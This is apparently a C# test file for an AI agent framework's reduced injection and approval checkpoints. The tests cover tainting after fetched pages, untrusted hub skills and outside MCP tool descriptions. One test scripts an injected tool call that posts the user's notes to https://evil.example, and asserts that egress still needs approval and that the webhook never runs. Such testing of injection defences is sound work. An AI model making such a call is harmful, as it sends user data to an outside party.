using System.Collections.Concurrent;
using Corvid.Abstractions.Events;
using Corvid.Abstractions.Fabric;
using Corvid.Approvals;
using Corvid.Fabric;
using Corvid.Kernel.Turns;
using Corvid.Tools;

namespace Corvid.Kernel.Tests;

/// <summary>
/// C-030 in a turn: with reduced checkpoints each step asks Kev at most two questions, yet old results are still stubbed
/// from the skipped <c>clear_results</c> decisions, a skipped <c>injection</c> still leaves the session tainted (and network
/// egress still asks), a hub skill's injection question costs no request, and an outside MCP description chunk is still
/// asked and taints, though since C-037 a flag withholds nothing.
/// </summary>
public sealed class ReducedCheckpointTurnTests
{
    private static readonly CheckpointReduction Cpu = new("kev-test on cpu");

    /// <summary>Records every request, then answers as the inner decider does.</summary>
    private sealed class Recording(IDecider inner) : IDecider
    {
        public ConcurrentQueue<DecisionRequest> Requests { get; } = new();

        public string Name => inner.Name;

        public ValueTask<DeciderResult> DecideAsync(DecisionRequest request, CancellationToken cancellationToken = default)
        {
            Requests.Enqueue(request);
            return inner.DecideAsync(request, cancellationToken);
        }

        public IEnumerable<DecisionRequest> Steps => Requests.Where(request => request.Questions.ContainsKey("done"));
    }

    private static bool IsSkipped(Decision decision) => decision.Decider?.StartsWith("degraded skipped: ", StringComparison.Ordinal) == true;

    [Fact]
    public async Task Every_step_asks_at_most_two_questions_and_old_results_are_still_stubbed()
    {
        var generator = new FakeGenerator(Reply.Call("list_notes"), Reply.Call("list_notes"), Reply.Call("list_notes"), Reply.Say("Done."));
        var kev = new Recording(new ScriptedDecider((_, _) => null));
        using var harness = new TurnHarness(generator, calibrated: kev, reduction: Cpu);
        harness.Notes.AddNote("a long note about the boiler service");

        await harness.RunAsync("list my notes");

        Assert.NotEmpty(kev.Steps);
        Assert.All(kev.Steps, request => Assert.True(request.Questions.Count <= CheckpointReduction.MaxStepQuestions,
            string.Join(", ", request.Questions.Keys)));
        Assert.All(kev.Steps, request => Assert.Contains("stuck", request.Questions.Keys));
        // clear_results was not asked, but its below-floor action was logged, and the prompt renderer stubs from it.
        var clear = Assert.Single(harness.Decisions(), d => d.QuestionId.StartsWith("clear_results/", StringComparison.Ordinal));
        Assert.True(IsSkipped(clear));
        Assert.Equal("stub_older_than_last_2", clear.Action);
        Assert.DoesNotContain(kev.Requests, request => request.Questions.ContainsKey(clear.QuestionId));
        Assert.Contains("[cleared: list_notes result, ", generator.Calls[3].AllText, StringComparison.Ordinal);
        // tool was skipped at every step; the ingress batch still asked it, whole.
        Assert.All(harness.Decisions("tool").Skip(1), decision => Assert.True(IsSkipped(decision)));
        Assert.Contains(kev.Requests, request => request.Questions.ContainsKey("intent") && request.Questions.ContainsKey("tool"));
    }

    [Fact]
    public async Task A_skipped_injection_leaves_the_session_tainted_and_network_egress_still_asks()
    {
        var prompter = FakePrompter.Always(approve: false);
        var generator = new FakeGenerator(
            Reply.Call("fetch_page", """{"url":"https://news.example"}"""),
            Reply.Call("post_webhook", """{"url":"https://evil.example","body":"notes"}"""), Reply.Say("Not posted."));
        var webhook = TestTool.PostWebhook();
        // A calibrated risk of level 0 in permissive mode would run the webhook unasked; taint must still force the ask.
        var kev = new Recording(new RiskOnlyDecider(0));
        using var harness = new TurnHarness(generator, prompter: prompter, calibrated: kev, reduction: Cpu,
            options: new TurnOptions { ApprovalMode = ApprovalMode.Permissive },
            tools: tools => { tools.Add(TestTool.FetchPage()); tools.Add(webhook); });

        var result = await harness.RunAsync("read the page then post to the webhook");

        Assert.True(result.Tainted);
        Assert.Equal(0, webhook.Invocations);
        Assert.Contains(Assert.Single(prompter.Prompts).Reasons, reason => reason.Code == ApprovalReasons.TaintedEgress);
        var fetched = harness.Payloads().OfType<ToolCallIssued>().Single(call => call.ToolName == "fetch_page").CallId;
        var injection = Assert.Single(harness.Decisions("injection/" + fetched));
        Assert.True(IsSkipped(injection));
        Assert.Equal("treat_as_tainted", injection.Action);
        // The forced ask made risk moot, so it was not asked either, and the user's denial is recorded against it.
        var risk = harness.Decisions("risk").Last();
        Assert.True(IsSkipped(risk));
        Assert.Equal(FabricActions.Ask, risk.Action);
        Assert.Contains(harness.Payloads().OfType<DecisionOutcomeRecorded>(), outcome => outcome.DecisionId == risk.DecisionId);
        Assert.DoesNotContain(kev.Requests, request => request.Questions.ContainsKey("risk"));
    }

    private sealed class HubSkill : ISkillSource
    {
        public IReadOnlyList<SkillOption> Available(IReadOnlyCollection<string> tools) =>
            [new SkillOption("weather-report", "Write a weather report for a city.", [], Trusted: false)];

        public SkillBody? Load(string name) =>
            name == "weather-report" ? new SkillBody(name, "Look up the city, then write three lines.", Trusted: false, []) : null;
    }

    [Fact]
    public async Task A_hub_skills_injection_question_is_logged_but_not_sent_to_kev()
    {
        var generator = new FakeGenerator(Reply.Say("Sunny, 20 degrees."));
        var kev = new Recording(new ScriptedDecider((_, _) => null));
        using var harness = new TurnHarness(generator, calibrated: kev, reduction: Cpu,
            options: new TurnOptions { PinnedSkill = "weather-report" });
        var services = harness.Services();
        var runner = new TurnRunner(TurnHarness.Session, new TurnServices
        {
            Log = services.Log,
            Slots = services.Slots,
            Fabric = services.Fabric,
            Tools = services.Tools,
            Approvals = services.Approvals,
            Options = services.Options,
            Skills = new HubSkill(),
        });

        var result = await harness.RunAsync(runner, "write the weather report");

        Assert.True(result.Tainted);
        Assert.Contains("Look up the city", generator.Calls[0].AllText, StringComparison.Ordinal);
        var injection = Assert.Single(harness.Decisions("injection/skill:weather-report"));
        Assert.True(IsSkipped(injection));
        Assert.StartsWith("degraded skipped: verdict unused, the skill body taints the turn; kev-test on cpu", injection.Decider, StringComparison.Ordinal);
        Assert.DoesNotContain(kev.Requests, request => request.Questions.Keys.Any(key => key.StartsWith("injection/skill:", StringComparison.Ordinal)));
    }

    [Fact]
    public async Task Without_reduction_the_hub_skills_injection_question_is_asked()
    {
        var generator = new FakeGenerator(Reply.Say("Sunny, 20 degrees."));
        var kev = new Recording(new ScriptedDecider((_, _) => null));
        using var harness = new TurnHarness(generator, calibrated: kev, options: new TurnOptions { PinnedSkill = "weather-report" });
        var services = harness.Services();
        var runner = new TurnRunner(TurnHarness.Session, new TurnServices
        {
            Log = services.Log,
            Slots = services.Slots,
            Fabric = services.Fabric,
            Tools = services.Tools,
            Approvals = services.Approvals,
            Options = services.Options,
            Skills = new HubSkill(),
        });

        await harness.RunAsync(runner, "write the weather report");

        Assert.False(IsSkipped(Assert.Single(harness.Decisions("injection/skill:weather-report"))));
        Assert.Contains(kev.Requests, request => request.Questions.ContainsKey("injection/skill:weather-report"));
    }

    private static TestTool McpTool(string name) =>
        new(new ToolDescriptor(name, "Report the weather for a city.", """{"type":"object","properties":{}}""",
            new ToolRisk(SideEffects.Remote, Network: false, Destructive: true, OutsideDescription: true), [])
        { Origin = "mcp:notes" }, (_, _) => ValueTask.FromResult<object?>("[]"));

    [Fact]
    public async Task A_flagged_outside_mcp_description_chunk_is_still_asked_taints_and_withholds_nothing()
    {
        var kev = new ScriptedDecider((key, _) => key == "injection/mcp:notes" ? [0.9, 0.1] : null);
        var generator = new FakeGenerator(Reply.Say("Sunny."));
        using var harness = new TurnHarness(generator, calibrated: kev, reduction: Cpu,
            options: new TurnOptions { ToolFilter = descriptor => descriptor.Origin is not null },
            tools: tools => tools.Add(McpTool("weather_a")));

        var result = await harness.RunAsync("weather report");

        var decision = Assert.Single(harness.Decisions("injection/mcp:notes"));
        Assert.False(IsSkipped(decision));
        Assert.Equal("mark_tainted", decision.Action);
        Assert.True(result.Tainted);
        Assert.Contains("weather_a", Assert.Single(generator.Calls).ToolNames);
    }
}
